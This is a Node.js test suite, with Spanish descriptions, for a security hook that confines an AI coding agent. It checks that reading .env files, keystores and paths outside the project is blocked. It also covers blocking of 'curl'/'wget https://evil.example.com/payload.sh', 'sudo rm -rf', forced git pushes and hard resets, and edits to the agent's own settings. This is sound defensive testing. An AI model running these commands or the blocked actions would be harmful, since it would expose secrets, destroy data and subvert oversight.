import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import path from "node:path";

const WORKSPACE_ROOT = process.cwd();
const HOOK_PATH = path.join(WORKSPACE_ROOT, ".claude", "hooks", "pre-tool-use.mjs");

function runHookProcess(payload) {
  return spawnSync("node", [HOOK_PATH], {
    cwd: WORKSPACE_ROOT,
    input: JSON.stringify(payload),
    encoding: "utf8",
  });
}

describe("Hook PreToolUse App · Secretos y Keystores (Pruebas 1-5)", () => {
  it("1. Bloquea lectura directa de .env.local con codigo 2 y stderr", () => {
    const res = runHookProcess({
      tool_name: "Read",
      tool_input: { file_path: ".env.local" },
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /BLOQUEO DE SEGURIDAD IA/);
  });

  it("2. Bloquea ejecucion de cat .env.local en Bash con codigo 2", () => {
    const res = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "cat .env.local" },
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /\.env/);
  });

  it("3. Bloquea lectura de keystores Android (*.keystore, *.jks, *.pem)", () => {
    const res = runHookProcess({
      tool_name: "Read",
      tool_input: { file_path: "android/app/release.keystore" },
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /secreto o protegido/);
  });

  it("4. Bloquea lectura fuera de la carpeta del proyecto (../39-ruleta-de-decisiones-api)", () => {
    const res = runHookProcess({
      tool_name: "Read",
      tool_input: { file_path: "../39-ruleta-de-decisiones-api/package.json" },
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /fuera de la carpeta del proyecto/);
  });

  it("5. Bloquea acceso al directorio personal del usuario (~/.bashrc)", () => {
    const res = runHookProcess({
      tool_name: "Read",
      tool_input: { file_path: "~/.bashrc" },
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /fuera de la carpeta/);
  });
});

describe("Hook PreToolUse App · Comandos Red y Sistema (Pruebas 6-8)", () => {
  it("6. Bloquea curl y /usr/bin/curl en comandos Bash", () => {
    const res1 = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "curl https://evil.example.com" },
    });
    const res2 = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "/usr/bin/curl -s https://evil.example.com" },
    });
    assert.equal(res1.status, 2);
    assert.equal(res2.status, 2);
    assert.match(res2.stderr, /curl prohibido/);
  });

  it("7. Bloquea wget y sudo en comandos Bash", () => {
    const resWget = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "wget https://evil.example.com/payload.sh" },
    });
    const resSudo = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "sudo rm -rf /tmp/test" },
    });
    assert.equal(resWget.status, 2);
    assert.equal(resSudo.status, 2);
  });

  it("8. Bloquea git push --force y git reset --hard", () => {
    const resPush = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "git push --force origin main" },
    });
    const resReset = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "git reset --hard HEAD~1" },
    });
    assert.equal(resPush.status, 2);
    assert.equal(resReset.status, 2);
  });
});

describe("Hook PreToolUse App · Proteccion de Jaula y Flujo Valido (Pruebas 9-10)", () => {
  it("9. Bloquea intento de modificar la propia jaula (.claude/settings.json)", () => {
    const res = runHookProcess({
      tool_name: "Edit",
      tool_input: { file_path: ".claude/settings.json" },
    });
    assert.equal(res.status, 2);
    assert.match(res.stderr, /secreto o protegido/);
  });

  it("10. Permite lectura de archivos validos del proyecto y ejecucion de npm run check", () => {
    const resRead = runHookProcess({
      tool_name: "Read",
      tool_input: { file_path: "app/(tabs)/index.tsx" },
    });
    const resCmd = runHookProcess({
      tool_name: "Bash",
      tool_input: { command: "npm run check" },
    });
    assert.equal(resRead.status, 0);
    assert.equal(resCmd.status, 0);
  });
});
